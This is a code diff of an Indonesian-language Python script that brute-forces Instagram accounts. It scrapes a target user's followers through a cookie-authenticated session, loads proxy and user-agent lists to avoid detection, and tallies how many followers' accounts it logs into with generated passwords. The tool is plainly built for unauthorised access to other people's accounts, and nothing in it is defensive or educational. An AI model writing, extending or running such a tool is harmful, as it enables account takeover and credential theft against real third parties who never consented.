@@ -4,20 +4,29 @@ import random
 from colorama import Fore, init
 from utils.scraper import scrape_followers
 from utils.password_gen import generate_passwords
-from utils.tools import login_real, load_list_from_file, get_user_info
+from utils.tools import login_real, load_list_from_file, get_user_info, login_with_cookie
 
 init(autoreset=True)
 
-def brute_force_real_mode(target_username):
-    print(Fore.YELLOW + f"🔍 Scraping followers dari: {target_username} ...")
-    followers = scrape_followers(target_username)
-    
+def brute_force_real_mode():
+    # Input interaktif username target
+    target_username = input(Fore.YELLOW + "Masukkan username target Instagram: ").strip()
+    print(Fore.YELLOW + f"\n🔍 Scraping followers dari: {target_username} ...")
+
+    # Login dulu (gunakan cookie.txt)
+    client = login_with_cookie("cookie.txt", "user.txt")
+    if not client:
+        print(Fore.RED + "❌ Gagal login menggunakan cookie.")
+        return
+
+    # Scrape followers (mengirim client login)
+    followers = scrape_followers(client, target_username)
     if not followers:
         print(Fore.RED + "❌ Gagal scrape followers atau tidak ada followers.")
         return
 
     print(Fore.GREEN + f"✅ Total followers ditemukan: {len(followers)}\n")
-    
+
     proxies = load_list_from_file("Proxy.txt")
     user_agents = load_list_from_file("User-agents.txt")
 
@@ -47,18 +56,12 @@ def brute_force_real_mode(target_username):
 
     print(Fore.YELLOW + f"\n📊 SELESAI: {berhasil} akun berhasil login dari total {total} target.\n")
 
-
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
-    parser.add_argument("--target", help="Username akun target (opsional, akan diminta jika tidak diberikan)")
     parser.add_argument("--mode", help="Mode: real / simulasi", choices=["real", "simulasi"], default="simulasi")
     args = parser.parse_args()
 
-    # Input interaktif jika --target tidak diberikan
-    if not args.target:
-        args.target = input("Masukkan username target Instagram: ").strip()
-
     if args.mode == "real":
-        brute_force_real_mode(args.target)
+        brute_force_real_mode()
     else:
         print(Fore.YELLOW + "🔧 Mode simulasi belum diimplementasikan.")
